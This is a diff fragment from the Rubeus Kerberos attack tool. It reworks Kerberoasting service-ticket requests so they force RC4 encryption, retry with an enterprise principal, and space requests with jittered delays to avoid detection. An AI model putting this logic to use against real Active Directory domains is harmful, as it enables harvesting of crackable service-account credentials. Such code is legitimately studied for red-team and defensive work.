@@ -499,6 +499,7 @@ namespace Rubeus
                             }
                             if (TGT != null)
                             {
+                                Interop.KERB_ETYPE etype = Interop.KERB_ETYPE.subkey_keymaterial;
                                 // if a TGT .kirbi is supplied, use that for the request
                                 //      this could be a passed TGT or if TGT delegation is specified
 
@@ -510,28 +511,17 @@ namespace Rubeus
                                    )
                                 {
                                     // if we're roasting RC4, but AES is supported AND we have a TGT, specify RC4
-                                    bool result = GetTGSRepHash(TGT, servicePrincipalName, samAccountName, distinguishedName, outFile, simpleOutput, enterprise, dc, Interop.KERB_ETYPE.rc4_hmac);
-                                    Helpers.RandomDelayWithJitter(delay, jitter);
-                                    if (!result && autoenterprise)
-                                    {
-                                        Console.WriteLine("\r\n[-] Retrieving service ticket with SPN failed and '/autoenterprise' passed, retrying with the enterprise principal");
-                                        servicePrincipalName = String.Format("{0}@{1}", samAccountName, domain);
-                                        GetTGSRepHash(TGT, servicePrincipalName, samAccountName, distinguishedName, outFile, simpleOutput, true, dc, Interop.KERB_ETYPE.rc4_hmac);
-                                        Helpers.RandomDelayWithJitter(delay, jitter);
-                                    }
+                                    etype = Interop.KERB_ETYPE.rc4_hmac;
                                 }
-                                else
+                                
+                                bool result = GetTGSRepHash(TGT, servicePrincipalName, samAccountName, distinguishedName, outFile, simpleOutput, enterprise, dc, etype);
+                                Helpers.RandomDelayWithJitter(delay, jitter);
+                                if (!result && autoenterprise)
                                 {
-                                    // otherwise don't force RC4 - have all supported encryption types for opsec reasons
-                                    bool result = GetTGSRepHash(TGT, servicePrincipalName, samAccountName, distinguishedName, outFile, simpleOutput, enterprise, dc);
+                                    Console.WriteLine("\r\n[-] Retrieving service ticket with SPN failed and '/autoenterprise' passed, retrying with the enterprise principal");
+                                    servicePrincipalName = String.Format("{0}@{1}", samAccountName, domain);
+                                    GetTGSRepHash(TGT, servicePrincipalName, samAccountName, distinguishedName, outFile, simpleOutput, true, dc, etype);
                                     Helpers.RandomDelayWithJitter(delay, jitter);
-                                    if (!result && autoenterprise)
-                                    {
-                                        Console.WriteLine("\r\n[-] Retrieving service ticket with SPN failed and '/autoenterprise' passed, retrying with the enterprise principal");
-                                        servicePrincipalName = String.Format("{0}@{1}", samAccountName, domain);
-                                        GetTGSRepHash(TGT, servicePrincipalName, samAccountName, distinguishedName, outFile, simpleOutput, true, dc);
-                                        Helpers.RandomDelayWithJitter(delay, jitter);
-                                    }
                                 }
                             }
                             else
@@ -539,13 +529,6 @@ namespace Rubeus
                                 // otherwise use the KerberosRequestorSecurityToken method
                                 bool result = GetTGSRepHash(servicePrincipalName, samAccountName, distinguishedName, cred, outFile, simpleOutput);
                                 Helpers.RandomDelayWithJitter(delay, jitter);
-                                if (!result && autoenterprise)
-                                {
-                                    Console.WriteLine("\r\n[-] Retrieving service ticket with SPN failed and '/autoenterprise' passed, retrying with the enterprise principal");
-                                    servicePrincipalName = String.Format("{0}@{1}", samAccountName, domain);
-                                    GetTGSRepHash(servicePrincipalName, samAccountName, distinguishedName, cred, outFile, simpleOutput);
-                                    Helpers.RandomDelayWithJitter(delay, jitter);
-                                }
                             }
                         }
                     }
